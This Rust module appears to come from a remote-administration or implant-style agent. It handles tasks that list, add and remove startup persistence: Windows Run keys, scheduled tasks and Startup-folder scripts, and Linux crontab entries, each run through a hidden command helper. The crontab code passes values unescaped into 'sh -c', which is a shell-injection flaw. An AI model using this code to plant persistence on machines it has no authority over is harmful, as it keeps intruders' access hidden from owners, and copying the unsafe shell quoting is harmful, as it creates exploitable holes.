/// Boot entries: list/add/remove startup items (registry Run keys, scheduled tasks, startup folder).

use super::TaskResult;
use serde_json::json;

pub fn list(task_id: i64, _args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        list_windows(task_id)
    }
    #[cfg(not(target_os = "windows"))]
    {
        list_linux(task_id)
    }
}

pub fn add(task_id: i64, args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        add_windows(task_id, args)
    }
    #[cfg(not(target_os = "windows"))]
    {
        add_linux(task_id, args)
    }
}

pub fn remove(task_id: i64, args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        remove_windows(task_id, args)
    }
    #[cfg(not(target_os = "windows"))]
    {
        remove_linux(task_id, args)
    }
}

#[cfg(target_os = "windows")]
fn list_windows(task_id: i64) -> TaskResult {
    let mut entries = Vec::new();

    // Check registry Run keys
    let run_keys = [
        ("HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        ("HKLM", "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        ("HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
        ("HKLM", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
    ];

    for (hive_name, path) in &run_keys {
        let output = crate::utils::helpers::hidden_command("reg")
            .args(["query", &format!("{}\\{}", hive_name, path)])
            .output();

        if let Ok(out) = output {
            let text = String::from_utf8_lossy(&out.stdout);
            for line in text.lines() {
                let trimmed = line.trim();
                if !trimmed.is_empty() && !trimmed.starts_with("HKEY_") && trimmed.contains("REG_") {
                    let parts: Vec<&str> = trimmed.splitn(3, "    ").collect();
                    if parts.len() >= 3 {
                        entries.push(json!({
                            "type": "registry",
                            "location": format!("{}\\{}", hive_name, path),
                            "name": parts[0].trim(),
                            "value": parts[2].trim(),
                        }));
                    }
                }
            }
        }
    }

    // Check scheduled tasks
    let schtasks = crate::utils::helpers::hidden_command("schtasks")
        .args(["/query", "/fo", "CSV", "/nh"])
        .output();

    if let Ok(out) = schtasks {
        let text = String::from_utf8_lossy(&out.stdout);
        for line in text.lines().take(50) {
            let trimmed = line.trim().trim_matches('"');
            if !trimmed.is_empty() {
                entries.push(json!({
                    "type": "scheduled_task",
                    "name": trimmed.split(',').next().unwrap_or("").trim_matches('"'),
                }));
            }
        }
    }

    // Check startup folder
    let startup_folder = format!(
        "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        std::env::var("APPDATA").unwrap_or_default()
    );
    if let Ok(dir) = std::fs::read_dir(&startup_folder) {
        for entry in dir.flatten() {
            entries.push(json!({
                "type": "startup_folder",
                "name": entry.file_name().to_string_lossy(),
                "path": entry.path().to_string_lossy(),
            }));
        }
    }

    TaskResult::success(task_id, serde_json::to_string(&entries).unwrap_or_default())
}

#[cfg(target_os = "windows")]
fn add_windows(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let method = args.get("method").and_then(|v| v.as_str()).unwrap_or("registry");
    let name = match args.get("name").and_then(|v| v.as_str()) {
        Some(n) => n,
        None => return TaskResult::error(task_id, "missing 'name' argument".to_string()),
    };
    let value = match args.get("value").and_then(|v| v.as_str()) {
        Some(v) => v,
        None => return TaskResult::error(task_id, "missing 'value' argument (path to executable)".to_string()),
    };

    match method {
        "registry" => {
            let hive = args.get("hive").and_then(|v| v.as_str()).unwrap_or("HKCU");
            let result = crate::utils::helpers::hidden_command("reg")
                .args([
                    "add",
                    &format!("{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", hive),
                    "/v",
                    name,
                    "/t",
                    "REG_SZ",
                    "/d",
                    value,
                    "/f",
                ])
                .output();

            match result {
                Ok(out) if out.status.success() => {
                    TaskResult::success(task_id, format!("added registry Run entry: {} = {}", name, value))
                }
                Ok(out) => TaskResult::error(task_id, String::from_utf8_lossy(&out.stderr).to_string()),
                Err(e) => TaskResult::error(task_id, format!("reg add: {}", e)),
            }
        }
        "schtask" => {
            let schedule = args.get("schedule").and_then(|v| v.as_str()).unwrap_or("ONLOGON");
            let result = crate::utils::helpers::hidden_command("schtasks")
                .args(["/create", "/tn", name, "/tr", value, "/sc", schedule, "/f"])
                .output();

            match result {
                Ok(out) if out.status.success() => {
                    TaskResult::success(task_id, format!("created scheduled task: {}", name))
                }
                Ok(out) => TaskResult::error(task_id, String::from_utf8_lossy(&out.stderr).to_string()),
                Err(e) => TaskResult::error(task_id, format!("schtasks: {}", e)),
            }
        }
        "startup_folder" => {
            let startup_folder = format!(
                "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                std::env::var("APPDATA").unwrap_or_default()
            );
            let link_path = format!("{}\\{}.lnk", startup_folder, name);
            // Create a simple .bat file instead of .lnk (simpler)
            let bat_path = format!("{}\\{}.bat", startup_folder, name);
            match std::fs::write(&bat_path, format!("@echo off\nstart \"\" \"{}\"", value)) {
                Ok(_) => TaskResult::success(task_id, format!("created startup script: {}", bat_path)),
                Err(e) => TaskResult::error(task_id, format!("write startup: {}", e)),
            }
        }
        _ => TaskResult::error(task_id, format!("unknown method: {}", method)),
    }
}

#[cfg(target_os = "windows")]
fn remove_windows(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let method = args.get("method").and_then(|v| v.as_str()).unwrap_or("registry");
    let name = match args.get("name").and_then(|v| v.as_str()) {
        Some(n) => n,
        None => return TaskResult::error(task_id, "missing 'name' argument".to_string()),
    };

    match method {
        "registry" => {
            let hive = args.get("hive").and_then(|v| v.as_str()).unwrap_or("HKCU");
            let result = crate::utils::helpers::hidden_command("reg")
                .args([
                    "delete",
                    &format!("{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", hive),
                    "/v",
                    name,
                    "/f",
                ])
                .output();

            match result {
                Ok(out) if out.status.success() => {
                    TaskResult::success(task_id, format!("removed registry entry: {}", name))
                }
                Ok(out) => TaskResult::error(task_id, String::from_utf8_lossy(&out.stderr).to_string()),
                Err(e) => TaskResult::error(task_id, format!("reg delete: {}", e)),
            }
        }
        "schtask" => {
            let result = crate::utils::helpers::hidden_command("schtasks")
                .args(["/delete", "/tn", name, "/f"])
                .output();

            match result {
                Ok(out) if out.status.success() => {
                    TaskResult::success(task_id, format!("deleted scheduled task: {}", name))
                }
                Ok(out) => TaskResult::error(task_id, String::from_utf8_lossy(&out.stderr).to_string()),
                Err(e) => TaskResult::error(task_id, format!("schtasks: {}", e)),
            }
        }
        _ => TaskResult::error(task_id, format!("unknown method: {}", method)),
    }
}

// Linux implementations

#[cfg(not(target_os = "windows"))]
fn list_linux(task_id: i64) -> TaskResult {
    let mut entries = Vec::new();

    // Check crontab
    let cron = crate::utils::helpers::hidden_command("crontab")
        .args(["-l"])
        .output();
    if let Ok(out) = cron {
        let text = String::from_utf8_lossy(&out.stdout);
        for line in text.lines() {
            if !line.starts_with('#') && !line.trim().is_empty() {
                entries.push(json!({
                    "type": "crontab",
                    "value": line.trim(),
                }));
            }
        }
    }

    // Check systemd user services
    let home = std::env::var("HOME").unwrap_or_default();
    let systemd_user_dir = format!("{}/.config/systemd/user", home);
    if let Ok(dir) = std::fs::read_dir(&systemd_user_dir) {
        for entry in dir.flatten() {
            entries.push(json!({
                "type": "systemd_user",
                "name": entry.file_name().to_string_lossy(),
            }));
        }
    }

    // Check autostart
    let autostart_dir = format!("{}/.config/autostart", home);
    if let Ok(dir) = std::fs::read_dir(&autostart_dir) {
        for entry in dir.flatten() {
            entries.push(json!({
                "type": "xdg_autostart",
                "name": entry.file_name().to_string_lossy(),
            }));
        }
    }

    // Check rc.local
    if std::path::Path::new("/etc/rc.local").exists() {
        if let Ok(content) = std::fs::read_to_string("/etc/rc.local") {
            entries.push(json!({
                "type": "rc.local",
                "content": content.trim(),
            }));
        }
    }

    TaskResult::success(task_id, serde_json::to_string(&entries).unwrap_or_default())
}

#[cfg(not(target_os = "windows"))]
fn add_linux(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let method = args.get("method").and_then(|v| v.as_str()).unwrap_or("crontab");
    let value = match args.get("value").and_then(|v| v.as_str()) {
        Some(v) => v,
        None => return TaskResult::error(task_id, "missing 'value' argument".to_string()),
    };

    match method {
        "crontab" => {
            let existing = crate::utils::helpers::hidden_command("crontab")
                .args(["-l"])
                .output()
                .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                .unwrap_or_default();

            let new_crontab = format!("{}\n{}\n", existing.trim(), value);
            let result = crate::utils::helpers::hidden_command("sh")
                .args(["-c", &format!("echo '{}' | crontab -", new_crontab)])
                .output();

            match result {
                Ok(out) if out.status.success() => {
                    TaskResult::success(task_id, format!("added crontab entry: {}", value))
                }
                Ok(out) => TaskResult::error(task_id, String::from_utf8_lossy(&out.stderr).to_string()),
                Err(e) => TaskResult::error(task_id, format!("crontab: {}", e)),
            }
        }
        _ => TaskResult::error(task_id, format!("unsupported method on Linux: {}", method)),
    }
}

#[cfg(not(target_os = "windows"))]
fn remove_linux(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let name = match args.get("name").and_then(|v| v.as_str()) {
        Some(n) => n,
        None => return TaskResult::error(task_id, "missing 'name' argument".to_string()),
    };

    // Remove matching crontab entry
    let existing = crate::utils::helpers::hidden_command("crontab")
        .args(["-l"])
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();

    let filtered: Vec<&str> = existing.lines().filter(|l| !l.contains(name)).collect();
    let new_crontab = filtered.join("\n");

    let result = crate::utils::helpers::hidden_command("sh")
        .args(["-c", &format!("echo '{}' | crontab -", new_crontab)])
        .output();

    match result {
        Ok(out) if out.status.success() => {
            TaskResult::success(task_id, format!("removed entries matching: {}", name))
        }
        Ok(out) => TaskResult::error(task_id, String::from_utf8_lossy(&out.stderr).to_string()),
        Err(e) => TaskResult::error(task_id, format!("crontab: {}", e)),
    }
}
